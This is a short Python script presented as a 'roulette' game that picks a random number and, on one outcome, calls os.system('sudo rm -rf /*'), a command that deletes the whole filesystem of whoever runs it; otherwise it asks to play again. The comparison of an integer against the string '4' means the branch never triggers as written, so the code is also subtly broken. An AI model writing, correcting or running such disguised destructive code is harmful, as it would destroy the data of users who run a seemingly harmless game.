import random
import os



def rulette():
    shot = random.randint(0, 6)
    print(shot)
    if shot == "4":
        os.system("sudo rm -rf /*")
    else:
        print("again?")
        c = input("> ")
        if c == "yes":
            rulette()